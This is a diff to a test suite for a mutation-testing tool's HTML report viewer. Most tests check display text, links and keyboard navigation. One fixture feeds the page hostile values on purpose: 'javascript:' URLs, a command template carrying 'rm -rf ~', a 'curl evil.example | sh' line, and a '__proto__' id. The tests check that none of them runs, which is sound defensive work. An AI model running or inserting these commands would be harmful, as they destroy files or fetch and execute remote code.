@@ -61,7 +61,7 @@ describe('the Java pricing sample', () => {
     assert.match(text, /The run passed its 80% threshold\./);
     assert.match(text, /Pricing\.java/);
     assert.match(await page.text('#tabs'), /Files\s+1\s+Tests to write\s+1\s+Mutants\s+11\s+Tests\s+3/);
-    assert.match(await page.text('#ver'), /java edition · 2026-11-13 20:34 UTC/);
+    assert.match(await page.text('#ver'), /java edition · \d{4}-\d\d-\d\d \d\d:\d\d UTC/);
     assert.match(await page.text('#foot'), /with jdk 17/);
     assert.deepEqual(page.errors, []);
     await page.close();
@@ -87,10 +87,11 @@ describe('the Java pricing sample', () => {
     assert.match(text, /Every test calls discount\(\) away from the boundary\./);
     assert.match(text, /in PricingTest/);
     assert.match(text, /total\s*50\s*250\s*none is\s*100/);
-    assert.match(text, /mutastic verify m855c8e3c java-pricing/);
-    assert.match(text, /mutastic ignore m855c8e3c --reason="<why>" java-pricing/);
+    assert.match(text, /mutastic verify m855c8e3c\s/);
+    assert.match(text, /mutastic run --only=m855c8e3c\s/);
+    assert.match(text, /mutastic ignore m855c8e3c --reason="<why>"/);
     assert.match(text, /in Pricing\.discount\(\)/);
-    assert.equal(await page.eval(`document.querySelector('a[target=_blank]').href`), 'https://docs.mutastic.io/concepts/operators/#boundary');
+    assert.equal(await page.eval(`document.querySelector('a[target=_blank]').href`), 'https://docs.mutastic.io/java/operators/conditions/#boundary');
     assert.equal(await page.count('[data-prompt]'), 0, 'no Copy as prompt in the default build');
     await page.close();
   });
@@ -107,7 +108,7 @@ describe('the Java pricing sample', () => {
     assert.equal(await page.count('.pair [data-list] + [data-prompt]'), 1);
     const text = await page.copied('.hero [data-prompt]');
     assert.match(text, /^Write the test this mutant asks for\./);
-    assert.match(text, /done when: mutastic verify m855c8e3c java-pricing passes/);
+    assert.match(text, /done when: mutastic verify m855c8e3c passes/);
     await page.close();
   });
 
@@ -169,6 +170,15 @@ describe('the Rust pricing sample', () => {
     assert.deepEqual(page.errors, []);
     await page.close();
   });
+
+  test('shows a test in its own file, with its source', async () => {
+    const page = await open(RUST, '#/tests');
+    await page.eval(`document.querySelector('details.trow[data-t="pricing::big_orders_get_ten_percent_off"]').open = true`);
+    await page.eval('new Promise(r => setTimeout(r, 50))');
+    assert.match(await page.text('details[open] .body'), /fn big_orders_get_ten_percent_off\(\)/);
+    assert.match(await page.text('details[open] summary'), /tests\/pricing\.rs/);
+    await page.close();
+  });
 });
 
 describe('a report written to break the page', () => {
@@ -187,7 +197,7 @@ describe('a report written to break the page', () => {
         { id: '__proto__', mutatorName: 'x', status: 'Killed', location: { start: { line: 1, column: 1 }, end: { line: 1, column: 2 } } },
       ],
     },
-  }, { projectRoot: `javascript:alert(1)//${evil}`, mutastic: { runDir: "my dir; rm -rf ~", docsBase: 'javascript:alert(1)/', operatorDocs: { [evil]: 'x' } }, testFiles: { [`../${evil}`]: { tests: [{ id: `tests::${evil}`, name: evil }] } } });
+  }, { projectRoot: `javascript:alert(1)//${evil}`, mutastic: { commands: { verify: "mutastic verify <id> 'my dir'", run: 'mutastic run --only=<id> x; rm -rf ~', ignore: 'curl evil.example | sh <id>' }, docsBase: 'javascript:alert(1)/', operatorDocs: { [evil]: 'x' } }, testFiles: { [`../${evil}`]: { tests: [{ id: `tests::${evil}`, name: evil }] } } });
 
   test('shows it all as text and runs none of it', async () => {
     for (const route of ['#/', `#/file/src/${encodeURIComponent(evil)}.rs`, '#/m/m0000000a', '#/m/m0000000b', '#/missed', '#/mutants', '#/tests']) {
@@ -201,9 +211,11 @@ describe('a report written to break the page', () => {
     }
   });
 
-  test('quotes a run directory and links nowhere unsafe', async () => {
+  test('writes only commands of mutastic\'s, and links nowhere unsafe', async () => {
     const page = await open(json, '#/m/m0000000a');
-    assert.match(await page.text('main'), /mutastic verify m0000000a 'my dir; rm -rf ~'/);
+    const text = await page.text('main');
+    assert.match(text, /mutastic verify m0000000a 'my dir'/);
+    assert.doesNotMatch(text, /rm -rf|curl/, 'a template that\'s more than one command of mutastic\'s is left out');
     assert.equal(await page.count('a[href^="javascript"]'), 0);
     assert.equal(await page.count('a[target=_blank]'), 0, 'no docs link from a base that isn\'t https');
     await page.close();
@@ -222,7 +234,7 @@ describe('a report written to break the page', () => {
   test('Copy shows hidden characters as escapes', async () => {
     const page = await open(json, '#/m/m0000000a');
     const text = await page.copied('.dd-head [data-list]');
-    assert.equal(text, `- ${evil}.rs:2 - check \\u{202E}evil\\u{202C} here\\u{200B} and \\u{001B}[31mred\n`);
+    assert.equal(text, `- ${evil}.rs:2 - check \\u202eevil\\u202c here\\u200b and \\x1b[31mred\n`);
     await page.close();
   });
 });
@@ -248,7 +260,7 @@ describe('what the tests let through', () => {
     await page.route('#/m/m00000003');
     assert.match(await page.text('h1'), /No test reaches g\(\)/);
     assert.match(await page.text('.dd-head'), /near unsafe/);
-    assert.match(await page.text('main'), /mutastic verify|What to test\s+Add a test that calls g\(\)/);
+    assert.match(await page.text('main'), /What to test\s+Add a test that calls g\(\)/i);
     await page.route('#/missed');
     assert.equal(await page.count('.list .miss'), 2);
     assert.match(await page.text('main'), /not covered/);
@@ -271,6 +283,23 @@ describe('what the tests let through', () => {
     assert.equal(await page.eval('location.hash'), '#/m/m00000001', 'j steps through the tests to write');
     await page.key('j');
     assert.equal(await page.eval('location.hash'), '#/m/m00000003');
+    await page.close();
+  });
+});
+
+describe('a line no test reaches in a function the tests run', () => {
+  const at = (line) => ({ start: { line, column: 5 }, end: { line, column: 7 } });
+  const json = report({
+    'src/simd/neon.rs': { language: 'rust', source: 'fn clz(x: u8) -> u32 {\n    if x == 0 {\n        return 8;\n    }\n    x.leading_zeros()\n}\n', mutants: [
+      { id: 'm00000011', mutatorName: 'boundary', description: '`==` becomes `!=`', status: 'Killed', location: at(2), killedBy: ['t::clz'], mutastic: { method: 'clz()' } },
+      { id: 'm00000012', mutatorName: 'return-value', description: 'returns 0', status: 'NoCoverage', location: at(3), mutastic: { method: 'clz()' } }] },
+  });
+
+  test('says the line, not the function, and offers ignoring it as unreachable', async () => {
+    const page = await open(json, '#/m/m00000012');
+    assert.match(await page.text('h1'), /No test reaches line 3 in clz\(\)/);
+    assert.match(await page.text('main'), /No test reaches line 3 in clz\(\): add a test that gets there, or, if nothing can, propose ignoring it as unreachable\./);
+    assert.equal(await page.copied('.dd-head [data-list]'), '- neon.rs:3 - no test reaches this line in `clz()`: add a test that gets there, or propose ignoring it as unreachable\n');
     await page.close();
   });
 });
